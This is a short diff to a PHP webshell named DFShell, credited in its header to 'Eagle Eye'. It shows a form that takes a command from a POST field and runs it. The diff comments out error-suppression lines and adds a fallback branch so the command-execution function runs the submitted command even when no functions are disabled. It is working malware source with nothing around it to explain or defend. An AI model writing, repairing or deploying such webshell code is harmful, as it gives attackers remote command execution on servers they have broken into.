@@ -2,9 +2,9 @@
 
 namespace DFM;
 
-ini_set('display_errors', 0);
-ini_set('display_startup_errors', 0);
-error_reporting(0);
+#ini_set('display_errors', 0);
+#ini_set('display_startup_errors', 0);
+#error_reporting(0);
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 #                                                                               #
 #           This webshell are programmed and modified by Eagle Eye              #
@@ -422,6 +422,7 @@ class DFShell{
                 echo "<form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>";
                 if(isset($GLOBALS['DFConfig'][1]['dfscmd']) && !empty($GLOBALS['DFConfig'][1]['dfscmd'])){
                    $this->DFSExecute($GLOBALS['DFConfig'][1]['dfscmd']);
+             
                 }
                 echo "</textarea><br><input type='text' name='dfscmd' placeholder='whoami'><br><button>Execute</button></form>";
                 echo "</section>";
@@ -802,7 +803,6 @@ class DFShell{
     }
 
     public function DFSExecute($command){
-        
         if($this->DFSDat('ini','disable_functions')!=="None"){
             $disCMD = explode(",",$this->DFSDat('ini','disable_functions'));
             foreach($GLOBALS['DFSCmd'] as $cmd){
@@ -816,6 +816,8 @@ class DFShell{
             }else{
                 return $availCMD($command);
             }
+        }else{
+            return $GLOBALS['DFSCmd'][0]($command);
         }
     }
 
